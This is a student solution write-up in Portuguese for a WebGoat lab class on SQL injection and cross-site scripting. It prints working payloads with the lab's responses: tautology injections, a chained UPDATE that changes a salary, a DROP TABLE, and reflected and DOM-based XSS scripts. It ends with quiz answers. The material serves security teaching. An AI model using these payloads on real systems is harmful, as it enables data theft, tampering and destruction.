# Aula TP 12 - 18/Maio/2021 - Resolução

## Pergunta P1.1

Em seguida apresentam-se as *queries* definidas para resolver cada um dos 9 problemas (2, 3, 4, 5, 9, 10, 11, 12, 13) e as respostas dadas pelo servidor.



### Problema 2 - What is SQL?

Com a query SQL: 
>SELECT * FROM Employees WHERE last_name = 'Franco' and first_name ='Bob'

obteve-se:

```
You have succeeded!

SELECT * FROM Employees WHERE last_name = 'Franco' and first_name ='Bob'

USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
96134	Bob	Franco	Marketing	83700	LO9S2V
```

O Bob pertence ao departamento de Marketing.



### Problema 3 - Data Manipulation Language (DML)

Com a query SQL: 
>UPDATE Employees SET department= 'Sales' WHERE last_name = 'Barnett' and first_name ='Tobi'

obteve-se:

```
Congratulations. You have successfully completed the assignment.

UPDATE Employees SET department= 'Sales' WHERE last_name = 'Barnett' and first_name ='Tobi'

USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
89762	Tobi	Barnett	Sales	77000	TA9LL1
```

O Tobi passou a pertencer ao departamento Sales.


### Problema 4 - Data Definition Language (DDL)


Com a query SQL: 
> ALTER TABLE employees ADD phone varchar(20);

obteve-se:

```
Congratulations. You have successfully completed the assignment.

ALTER TABLE employees ADD phone varchar(20);
```

### Problema 5 - Data Control Language (DCL)

Com a query SQL: 
> GRANT ALTER TABLE To UnauthorizedUser;

obteve-se:

```
Congratulations. You have successfully completed the assignment.

GRANT ALTER TABLE To UnauthorizedUser;
```

### Problema 9 - Try It! String SQL injection

Com a query SQL: 
> SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'

obteve-se:

```
You have succeeded:

USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
101, Joe, Snow, 987654321, VISA, , 0,
101, Joe, Snow, 2234200065411, MC, , 0,
102, John, Smith, 2435600002222, MC, , 0,
102, John, Smith, 4352209902222, AMEX, , 0,
103, Jane, Plane, 123456789, MC, , 0,
103, Jane, Plane, 333498703333, AMEX, , 0,
10312, Jolly, Hershey, 176896789, MC, , 0,
10312, Jolly, Hershey, 333300003333, AMEX, , 0,
10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
15603, Peter, Sand, 123609789, MC, , 0,
15603, Peter, Sand, 338893453333, AMEX, , 0,
15613, Joesph, Something, 33843453533, AMEX, , 0,
15837, Chaos, Monkey, 32849386533, CM, , 0,
19204, Mr, Goat, 33812953533, VISA, , 0,
```


### Problema 10 - Try It! Numeric SQL injection

Preenchendo os campos ``Login_Count`` e ``User_Id`` com valores númericos aleatórios basta garantir que em ``User_Id`` se coloca uma condição que retorna sempre ``True`` ("1" = "1").

Por exemplo, com os valores:

>Login_Count: 1

>User_Id: 1 or "1" = "1"

obteve-se:

```
You have succeeded:
USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
101, Joe, Snow, 987654321, VISA, , 0,
101, Joe, Snow, 2234200065411, MC, , 0,
102, John, Smith, 2435600002222, MC, , 0,
102, John, Smith, 4352209902222, AMEX, , 0,
103, Jane, Plane, 123456789, MC, , 0,
103, Jane, Plane, 333498703333, AMEX, , 0,
10312, Jolly, Hershey, 176896789, MC, , 0,
10312, Jolly, Hershey, 333300003333, AMEX, , 0,
10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
15603, Peter, Sand, 123609789, MC, , 0,
15603, Peter, Sand, 338893453333, AMEX, , 0,
15613, Joesph, Something, 33843453533, AMEX, , 0,
15837, Chaos, Monkey, 32849386533, CM, , 0,
19204, Mr, Goat, 33812953533, VISA, , 0,

```

### Problema 11 - Compromising confidentiality with String SQL injection

Preenchendo os campos com os dados indicados, basta garantir que em ``Authentication TAN`` se coloca uma condição que retorna sempre ``True``. Na seleção da opção é preciso ter em atenção as aspas que já se encontram na *query*.

>Employee Name: Smith 

>Authentication TAN: 3SL99A' OR '1'='1


obteve-se:

```
You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!


USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN	PHONE
32147	Paulina	Travers	Accounting	46000	P45JSI	null
34477	Abraham	Holman	Development	50000	UU2ALK	null
37648	John	Smith	Marketing	64350	3SL99A	null
89762	Tobi	Barnett	Sales	77000	TA9LL1	null
96134	Bob	Franco	Marketing	83700	LO9S2V	null

```

### Problema 12 - Compromising Integrity with Query chaining


Preenchendo os campos da seguinte maneira:

>Employee Name: Smith 

>Authentication TAN: '; UPDATE Employees SET salary=1000000 WHERE last_name='Smith' --


obteve-se:

```
Well done! Now you are earning the most money. And at the same time you successfully compromised the integrity of data by changing the salary!


USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN	PHONE
37648	John	Smith	Marketing	1000000	3SL99A	null
96134	Bob	Franco	Marketing	83700	LO9S2V	null
89762	Tobi	Barnett	Sales	77000	TA9LL1	null
34477	Abraham	Holman	Development	50000	UU2ALK	null
32147	Paulina	Travers	Accounting	46000	P45JSI	null

```


### Problema 13 - Compromising Availability


Preenchendo os campos da seguinte maneira:

>Action contains: '; DROP TABLE access_log

obteve-se:

```
Success! You successfully deleted the access_log table and that way compromised the availability of the data.

```


## Pergunta P2.1

Em seguida apresentam-se as respostas a cada um dos cinco problemas (2, 7, 10, 11, 12).


### Problema 2 - What is XSS?

A informação apresentada nas duas páginas abertas é igual.
Assim, quando submetemos a resposta:

>yes

Obtemos:
```
Congratulations. You have successfully completed the assignment.
```

### Problema 7 - Try It! Reflected XSS

Com a leitura das secções informativas 3, 4, 5, 6 e ainda com a realização de alguns testes, percebeu-se que este problema pode ser concluido com sucesso se colocarmos no campo ``Credit card number`` o seguinte: <script\>alert()<\/script>.

Obtemos:

```
Well done, but alerts are not very impressive are they? Please continue.

```


### Problema 10 - Identify potential for DOM-Based XSS

Para resolver este problema utilizámos a funcionalidade "Inspecionar página" do Chrome. Fazendo uma breve análise ao código fonte descobrimos que a rota _webgoat/js/goastApp/view_ possui o ficheiro _GoatRouter.js_ que identifica todas as rotas disponíveis.

```
routes: {
    'welcome': 'welcomeRoute',
    'lesson/:name': 'lessonRoute',
    'lesson/:name/:pageNum': 'lessonPageRoute',
    'test/:param': 'testRoute',
    'reportCard': 'reportCard'
}
```

Observa-se facilmente que a rota de teste é a _test_. Assim, colocando na caixa de texto a resposta: _start.mvc#test/_, obtivemos: 

```
Correct! Now, see if you can send in an exploit to that route in the next assignment.
```
### Problema 11 - Try It! DOM-Based XSS

Na alínea anterior foi possivel descobrir a rota de teste: http://localhost:8080/WebGoat/start.mvc#test/. Por isso, basta agora adicionar o script _<script\>webgoat.customjs.phoneHome()</script\>_ como parâmetro.

Tentámos aceder a essa rota mas não foi possível obter o número. 
Depois de diversas tentativas foi necessário recorrer às ajudas disponíveis e verificámos que faltava substituir a '/' por '%2F' nos parâmetros.

Assim, acedendo à rota:


```
http://127.0.0.1:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>

```
obteve-se na consola do chrome:


```
phone home said {"lessonCompleted":true,"feedback":"Congratulations. You have successfully completed the assignment.","output":"phoneHome Response is 1046500580","assignment":"DOMCrossSiteScripting","attemptWasMade":true}
```

Quando se submeteu o número _1046500580_ na caixa de texto o servidor validou a resposta emitindo um: _Correct!_.


### Problema 12 - Cross Site Scripting

Esta questão consiste num breve questionário.

Considerando as respostas:

1. opção 4 
2. opção 3
3. opção 1 
4. opção 2 
5. opção 4 

Obteve-se:

```
Congratulations. You have successfully completed the assignment.
```